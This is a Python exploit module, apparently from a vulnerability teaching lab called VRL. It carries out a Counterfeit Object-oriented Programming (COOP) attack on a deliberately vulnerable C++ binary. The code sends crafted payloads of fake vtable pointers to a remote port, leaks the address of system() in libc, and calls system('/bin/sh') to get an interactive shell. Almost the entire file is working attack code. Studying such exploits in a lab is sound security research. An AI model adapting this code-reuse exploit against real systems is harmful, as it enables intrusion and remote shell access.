#! /usr/bin/python
#coding:utf-8
import os
import socket
import sys
sys.path.append(os.path.abspath("../.."))
from modules import exploit
from pwnlib.tubes.remote import remote
from pwnlib.elf import ELF
from pwnlib.util.packing import *


class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'coop'
        self.in_new_terminal = False
        self.payload_info = 'DEP ON ALSR OFF'
        self.info = '''Exploit Name : coop
Exploit abstract :Counterfeit Object-oriented Programming,induces malicious program behavior by only invoking
chains of existing C++ virtual functions in a program through
corresponding existing call sites.
Author : guoyingjie
Support change payload : false'''
        self.property = {
                         'courseMLoopVptr':0x401178,#Course  vptr to mLoop -8
                         'studentsptr':0x7fffffffdc58,
                         'nstudent':0x4,
                         'studentptr0':0x7fffffffdc78,#
                         'studentptr1':0x7fffffffdc80,#
                         'studentptr2':0x7fffffffdc88,#
                         'studentptr3':0x7fffffffdca8,#
                         'coursePrintfSystemVptr':0x401190,#Course  vptr to printfSystem -8
                         'studentReadString':0x4011a8,#student vptr to readString -8
                         'examSumScore':0x4011d8,#exam vptr to sumScore -8
                         'scoreA':0x0,
                         'scoreB':0x0,
                         'scoreC':0x0,
                         'buibuttonClicked':0x401200,#guibutton vptr to clicked -8
                         'offset':24, # offset
                         'sysaddress':0x0} # system function address, initialize 0
        self.options={'dIP' : '127.0.0.1',
                      'port':'34567',
                      'allow_stack_exec' : 'False',
                      'static' : 'False',
                      'architecture' : 'amd64',
                      'aslr' : 'off'
                      }
        self.vulnerability= 'vulnerabilities/stack_overflow/coop'

    def run(self):
     if self.options['architecture'] == 'amd64':
      if self.options['static'] == 'False':
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
       # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.connect((self.options['dIP'], int(self.options['port'])))
        p = remote(self.options['dIP'], int(self.options['port']))
        #p = process('../../vulnerabilities/coop/coop')
        #a = raw_input('input: ')


        #set /bin/sh ASCII
        binsh = p32(0x6e69622f) + p32(0x0068732f) + p32(0x74697865) + p32(0x63003020) + p32(0x6e6f6e61) + p32(0x6c616369)
        
        #set payload
        temppayload = "b"*2
        #s.send(temppayload)
        p.sendline(temppayload)

        
        payload = binsh + p64(self.property['courseMLoopVptr']) + p64(self.property['studentsptr']) + p64(self.property['nstudent']) + p64(self.property['studentptr0']) + p64(self.property['studentptr1']) + p64(self.property['studentptr3']) + p64(self.property['studentptr2']) + p64(self.property['coursePrintfSystemVptr']) + p64(self.property['studentReadString']) + p64(self.property['examSumScore']) + p64(self.property['scoreA']) + p64(self.property['scoreB']) + p64(self.property['scoreC']) + p64(self.property['buibuttonClicked']) + p64(self.property['sysaddress'])
        #s.send(payload)
        p.sendline(payload)

        #get new sysaddress here
        #recv_data = s.recv(16)
        recv_data = p.recvline()
        self.property['sysaddress'] = int(recv_data,16)
        print "sysaddress = " + hex(self.property['sysaddress'])

        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

        #get /bin/sh offset
        binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
        print "binsh_addr_offset = " + hex(binsh_addr_offset)

        
        #get /bin/sh address
        binsh_addr = self.property['sysaddress'] + binsh_addr_offset
        
        print "binsh_addr = " + hex(binsh_addr)
        
        #set payload
        payload = p64(self.property['examSumScore']) + p64(self.property['scoreA']) + p64(self.property['scoreB']) + p64(self.property['scoreC']) + p64(self.property['buibuttonClicked']) + p64(binsh_addr) + p64(self.property['sysaddress'])
        #s.send(payload)
        p.sendline(payload)
        print 'interactive'
        #s.close()
        p.interactive()

      else:
        print 'static'
     elif self.options['architecture'] == 'i386':

      if self.options['static'] == 'False':
        print 'dl'
       
      else:
        print 'static'
       
     else:
        print 'Unrecognized architecture, stop.'
        return
       

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.frame_check():
        print 'Running:\n'
        exp.run()
